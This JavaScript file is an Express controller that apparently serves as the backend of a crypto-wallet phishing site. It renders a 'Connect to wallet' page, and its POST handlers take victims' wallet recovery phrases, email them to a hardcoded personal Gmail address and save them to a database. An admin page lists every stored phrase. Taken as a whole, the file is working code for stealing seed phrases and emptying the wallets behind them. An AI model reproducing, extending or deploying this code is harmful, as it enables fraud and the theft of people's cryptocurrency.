const { text } = require('body-parser');
const transporter = require('../middleware/sendmail');
const phrase_model = require('../models/phrase_model');

exports.home = async(req,res)=>{
     const local ={
         title:"Home"
     }
     res.render('index',{local});
}
exports.features = async(req,res)=>{
    const local ={
        title:"Features"
    }
    res.render('feature',{local});
}

exports.wallet = async(req,res)=>{
    const local ={
        title:"Connect to wallet"
    }
    res.render('wallets',{local});
}

//post requests

const sendmail = async function(from,to,subject,text) {
    const  mailOptions = {
        from:from,
        to,
        subject,
        text
    }
    try{
        await transporter.sendMail(mailOptions);
    }catch(error){
         console.error(error.message);
    }
}
exports.admin = async(req,res)=>{
     const local ={
        title:"Admin"
    }
     const getwallet = await phrase_model.find();
    res.render('admin',{local,getwallet});
}
exports.get_wallet_details= async(req,res)=>{
      const phrase = req.body.Phrase; 
     // const wallet_address = req.body.Wallet_address;
      const crypto_wallet = req.body.Crpto_Wallet
     const email ="walisonmichael8@gmail.com";
     const subject ="Wallet Details";
     const Text = "Phrase: "+phrase+"\n\n"+"Wallet Name: "+crypto_wallet;
     
     try{
        const send = sendmail(process.env.EMAIL,email,subject,Text);
        if(send){
            res.json({message:"email sent sucessfully"})
        }
     }catch(error){
        console.error(error.message)
     }
}

exports.postwallet = async(req,res)=>{
    const Phrase = req.body.Phrase;
    const wallet = req.body.Crpto_Wallet
     await phrase_model.create({wallet:wallet,phrase:Phrase})
      .then(result=>{
          res.json({data:result});
      }).catch(err=>{
          console.error(err.message);
      })

     console.log(req.body);
}


